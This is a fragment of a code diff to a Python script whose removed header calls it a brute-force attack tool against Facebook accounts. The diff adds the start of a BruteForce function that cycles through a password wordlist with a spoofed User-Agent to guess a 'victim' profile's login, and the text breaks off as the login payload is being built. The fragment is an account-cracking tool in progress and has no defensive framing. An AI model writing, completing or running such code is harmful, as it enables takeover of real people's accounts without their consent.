@@ -1,12 +1,3 @@
-# -*- coding: utf-8 -*-
-
-##################################
-# Program Name: Facebook ~ v 1.1.0
-# Working : Brute Force Attack on Facebook Accounts
-# Autor : kamilpaczkowski
-##################################
-
-# Imported Libraries
 import socket
 import time
 import os
@@ -67,4 +58,12 @@ def ID(url):
         print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Victim Profile URL " + rd + "!!!" + wi)
         exit(1)
 
-# Brute
+# Brute Force
+def BruteForce(url, wordlist):
+    try:
+        session = requests.Session()
+        session.headers['User-Agent'] = useragent()
+
+        for password in wordlist:
+            payload = {
+                'email'
